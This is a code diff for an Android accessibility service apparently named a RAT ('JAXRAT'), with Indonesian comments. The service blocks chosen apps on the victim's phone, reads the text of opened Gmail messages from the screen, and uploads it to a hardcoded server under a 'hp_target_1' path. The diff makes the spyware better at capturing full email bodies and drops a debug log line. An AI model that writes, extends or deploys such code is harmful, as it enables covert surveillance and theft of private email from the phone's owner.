@@ -13,14 +13,13 @@ import java.util.HashSet;
 import java.util.Set;
 
 public class JaxAccessibilityService extends AccessibilityService {
-    private static final String SERVER_URL = "http://192.168.1.23:5000"; // SESUAIKAN IP
+    private static final String SERVER_URL = "http://192.168.1.25:5000"; // SESUAIKAN IP
     private Set<String> blockedApps = new HashSet<>();
     private String lastScrapedText = "";
 
     @Override
     public void onServiceConnected() {
         super.onServiceConnected();
-        Log.d("JAXRAT", "Accessibility Service Connected");
         loadBlockedApps();
     }
 
@@ -37,54 +36,51 @@ public class JaxAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            if (event.getPackageName() != null) {
-                String packageName = event.getPackageName().toString();
-                
-                // 1. LOGIKA APP BLOCKER
-                loadBlockedApps(); // Reload setiap ganti layar
-                if (blockedApps.contains(packageName)) {
-                    performGlobalAction(GLOBAL_ACTION_HOME);
-                    Log.d("JAXRAT", "Memblokir aplikasi: " + packageName);
-                    return;
-                }
-
-                // 2. LOGIKA GMAIL SCRAPER
-                if (packageName.equals("com.google.android.gm")) {
-                    scrapeScreenText(getRootInActiveWindow());
-                }
-            }
-        } else if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
-            if (event.getPackageName() != null && event.getPackageName().toString().equals("com.google.android.gm")) {
-                scrapeScreenText(getRootInActiveWindow());
-            }
-        }
-    }
-
-    private void scrapeScreenText(AccessibilityNodeInfo root) {
-        if (root == null) return;
-        StringBuilder sb = new StringBuilder();
-        extractText(root, sb);
-        String finalText = sb.toString().trim();
+        if (event.getPackageName() == null) return;
+        String packageName = event.getPackageName().toString();
         
-        // Biar gak spam, cuma kirim kalau teksnya beda dan lumayan panjang
-        if (finalText.length() > 20 && !finalText.equals(lastScrapedText)) {
-            lastScrapedText = finalText;
-            kirimKeWeb(finalText);
+        // 1. APP BLOCKER
+        loadBlockedApps(); 
+        if (blockedApps.contains(packageName)) {
+            performGlobalAction(GLOBAL_ACTION_HOME);
+            return;
+        }
+
+        // 2. GMAIL SCRAPER
+        if (packageName.equals("com.google.android.gm")) {
+            if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
+                event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+                
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root != null) {
+                    StringBuilder sb = new StringBuilder();
+                    extractText(root, sb);
+                    String finalText = sb.toString().trim();
+                    
+                    // Filter: Cuma kirim kalau ini beneran isi email (ada kata Reply/Forward/To)
+                    // Dan panjang teksnya lumayan (bukan cuma judul inbox)
+                    if (finalText.length() > 100 && (finalText.contains("Reply") || finalText.contains("Forward") || finalText.contains("Balas") || finalText.contains("Teruskan"))) {
+                        if (!finalText.equals(lastScrapedText)) {
+                            lastScrapedText = finalText;
+                            kirimKeWeb("gmail", finalText);
+                        }
+                    }
+                }
+            }
         }
     }
 
     private void extractText(AccessibilityNodeInfo node, StringBuilder sb) {
         if (node == null) return;
         if (node.getText() != null) {
-            sb.append(node.getText().toString()).append(" ");
+            sb.append(node.getText().toString()).append("\n");
         }
         for (int i = 0; i < node.getChildCount(); i++) {
             extractText(node.getChild(i), sb);
         }
     }
 
-    private void kirimKeWeb(String text) {
+    private void kirimKeWeb(String type, String text) {
         new Thread(() -> {
             try {
                 URL url = new URL(SERVER_URL + "/api/upload_result/hp_target_1");
@@ -93,7 +89,7 @@ public class JaxAccessibilityService extends AccessibilityService {
                 conn.setRequestProperty("Content-Type", "application/json");
                 conn.setDoOutput(true);
                 JSONObject json = new JSONObject();
-                json.put("type", "gmail");
+                json.put("type", type);
                 json.put("data", text);
                 try (OutputStream os = conn.getOutputStream()) {
                     os.write(json.toString().getBytes("utf-8"));
